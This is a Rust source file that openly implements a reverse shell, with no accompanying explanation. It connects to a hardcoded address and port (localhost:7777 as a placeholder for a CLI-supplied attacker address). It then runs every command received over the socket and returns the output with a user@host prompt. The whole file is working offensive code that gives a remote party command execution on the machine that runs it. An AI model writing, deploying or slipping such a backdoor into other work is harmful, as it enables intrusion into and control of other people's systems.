use std::io::prelude::*;
use std::net::TcpStream;
use std::process::Command;

fn main() -> std::io::Result<()> {
    if cfg!(windows) {
        panic!("Doesnt work on windows, sorry");
    }

    // In from CLI: IP + Port
    let default_ip = "127.0.0.1";
    let default_port: usize = 7777;

    println!("Starting reverse shell!");
    let mut socket = TcpStream::connect(format!("{}:{}", default_ip, default_port))?;
    let mut reader = std::io::BufReader::new(socket.try_clone()?);
    socket.write_all(get_prompt().as_bytes())?;

    loop {
        let mut buf = String::new();
        let len = reader.read_line(&mut buf)?;
        if len == 0 {
            socket.write_all(get_prompt().as_bytes())?;
            continue;
        }

        let command = trim_newline(buf);


        match command.as_str() {
            "exit" => break,
            _ => {
                println!("Executing command: {}", command);
                let response = match exec(command) {
                    Ok(t) => t,
                    Err(e) => e.to_string(),
                };

                let output = format!("{}\n", response);
                socket.write_all(output.as_bytes())?;
                socket.write_all( get_prompt().as_bytes())?;
            }
        }
    }
    Ok(())
}

fn exec(input: String) -> std::io::Result<String> {
    let trimmed_input = trim_newline(input);
    let mut splitted_cmd = trimmed_input.split(' ');
    let mut cmd = Command::new(splitted_cmd.next().unwrap());
    for arg in splitted_cmd {
        cmd.arg(arg);
    }

    Ok(String::from_utf8_lossy(cmd.output()?.stdout.as_slice()).to_string())
}

fn get_prompt() -> String {
    let user = trim_newline(String::from_utf8(Command::new("whoami").output().unwrap().stdout).unwrap());
    let hostname = trim_newline(String::from_utf8(Command::new("hostname").output().unwrap().stdout).unwrap());
    format!("{}@{}: ", user, hostname)
}

// Helpers
fn trim_newline(s: String) -> String {
    let mut new_string = s;
    if new_string.ends_with('\n') {
        new_string.pop();
        if new_string.ends_with('\r') {
            new_string.pop();
        }
    }
    new_string
}
